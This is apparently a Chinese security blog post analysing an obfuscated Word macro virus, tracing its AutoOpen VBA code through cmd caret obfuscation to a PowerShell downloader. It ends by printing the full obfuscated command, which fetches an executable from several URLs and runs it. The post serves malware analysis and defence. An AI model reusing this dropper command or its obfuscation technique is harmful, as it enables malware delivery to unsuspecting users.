## 前言

一些宏病毒为了躲过某些杀软静态检测，采用一些混淆手段来使脚本更加不易检测，通常做法是动态混淆解密达到其目的。

## 分析

下面我们拿一个真实病毒的作法来分析一下，测试环境:Win7x64+Office2010,病毒样例sample.doc（MD5:
a564137f74ea2d65f8538faf89ef3897)，在VirusTotal查找可以发现已被绝大部分杀软给检测到了。

![image.png](https://image.3001.net/images/20181105/1541407355_5be0027be4452.png!small)

用Office打开sample.doc提示需要开启宏的信息（实际上是一张图片，以防用户机器没有开启宏，提示用户去开启它来达到感染的目的）

![image.png](https://image.3001.net/images/20181105/1541407369_5be00289481ed.png!small)

打开宏看到自动启动AutoOpen()函数，VBA代码基本上已混淆难以看懂

![image.png](https://image.3001.net/images/20181105/1541407383_5be0029791c69.png!small)

用F8单步调试一下定位到Shell调用外部命令位置

![image.png](https://image.3001.net/images/20181105/1541407393_5be002a10c66d.png!small)

这里可以看出调用了CMD命令执行了一段bat字符串脚本

  

![image.png](https://image.3001.net/images/20181105/1541407402_5be002aa7b17e.png!small)

这段代码咋一看也是混淆过的，这个里面有一个”^”符号，实际上这只是障眼法，这个符号没有实际意义，cmd在执行过程中会忽略这个字符（在windows上测试cmd.exe打开”c^a^l^c.^e^x^e”,可以打开计算器calc.exe）,不过我在win10上拷贝这段脚本已被windows
defender拦截了，说明微软已添加rule检测这类脚本，经过整理后发现依然是一段难易看懂的代码，有兴趣可以自己去拆分一下脚本更容易看懂，这里我将直接运行来看效果。

  

![image.png](https://image.3001.net/images/20181105/1541407419_5be002bb64771.png!small)

把这段脚本拷贝到cmd运行会发现cmd启动了powershell.exe执行一段code.

![image.png](https://image.3001.net/images/20181105/1541407472_5be002f07ee38.png!small)

这段稍容易看懂，它偿试从url下载一个exe文件到public目录下，但发现大小为0下载失败，这个url链接已经无效了。（细心会发现它实际偿试从5个url去下载exe文件），稍候该文件被自删除。

![image.png](https://image.3001.net/images/20181105/1541407494_5be00306d8820.png!small)

由于这个样例已被杀软拦截，下载链接也已失效，所以没法研究下载的exe做的事情，分享这篇文章是说明
一下混淆代码已是病毒常用手段了。Office是大家常用的办公软件，建议大家在使用Office的时候将宏安全设置禁用宏，不要轻易打开未知来源的office文件。

文章中分析的脚本文本我列举如下，以便有兴趣的朋友去研究一下如何加解密bat脚本的。

    
    
    CMd /V:^ON/C"^s^e^t r^k^w^b=^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^  ^}^}^{^hc^tac^}^;^k^a^er^b^;n^t^I^$ ^m^et^I^-e^k^ovn^I^;)ntI^$^ ^,KC^G^$(e^l^iFda^o^lnw^o^D^.^A^t^z$^{^yr^t^{)^h^fr^$^ n^i^ ^KC^G^$(^hc^a^er^o^f^;^'^e^x^e.^'^+^YC^f^$^+^'^\^'^+c^i^l^b^up^:vne^$^=n^t^I^$^;^'^7^45^'^ ^=^ ^YC^f^$^;)^'^@^'(^t^i^l^p^S^.^'^I^3^B^k^S^S^h^6/^ur^.^5^5z^u^o^s^f^or^p//^:^p^t^t^h@^Gi^K^L^J^3^D^h^q^u/^gro^.c^e^dr^a^ka^d^ivav^iv//^:^p^t^t^h^@^f^H^T^P^O^i^7/^z^y^x^.^a^b^a^b^m^e^kr^o^g//^:^p^t^t^h^@^7^P^u^F^w^q^B^p^XV/^m^oc^.^k^p^k^a^s^p//^:p^t^t^h@^o^b2^qdn^B^p/^m^oc^.c^m^d^tc^a^p^moc//^:^p^t^t^h^'=^h^fr^$^;^tn^e^i^lC^b^e^W.^t^eN^ ^tc^e^j^bo^-^w^en^=^A^t^z^$^ ^l^l^e^hsr^ew^o^p&&^f^or /^L %^X ^in (^3^6^6^;^-^1;^0)^d^o ^s^e^t ^Sr^u^J=!^Sr^u^J!!r^k^w^b:~%^X,1!&&^i^f %^X=^=^0 c^a^l^l %^Sr^u^J:^~^6%"

